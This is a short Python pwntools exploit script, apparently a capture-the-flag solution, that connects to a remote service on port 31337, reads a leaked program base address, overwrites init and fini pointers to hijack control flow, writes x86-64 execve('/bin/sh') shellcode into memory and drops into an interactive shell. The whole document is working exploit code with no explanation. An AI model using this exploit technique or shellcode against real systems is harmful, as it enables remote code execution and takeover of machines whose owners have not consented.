#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
t = io.recv(8)
pie = u64(t)
#pause()

#io.send(p64(pie+0x4328))#set init 0
#io.send(p64(pie+0x10b2))# ret
'''
io.send(p64(pie+0x4320))#set pre init 2
io.send(p64(pie+0x10b2))# ret
io.send(p64(pie+0x4330))#set init 1
io.send(p64(pie+0x10b2))# ret
'''
io.send(p64(pie+0x4330))#set init 1
io.send(p64(pie+0x1370))
io.send(p64(pie+0x4338))#set fini
io.send(p64(pie+0x1200))# start
io.send(p64(0))

#main
io.send(p32(0))

io.recvline()


t = io.recv(8)
pie = u64(t)

sc = b'j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05'

for i in range(3):
    io.send(p64(pie+0x2140+8*i))
    io.send(sc[8*i:8*i+8])
    
#pie = u64(t)
#print(hex(pie))
#pause()


io.send(p64(0))

import time
time.sleep(0.5)

io.sendline("./submitter")
print(io.recvline())



io.interactive()
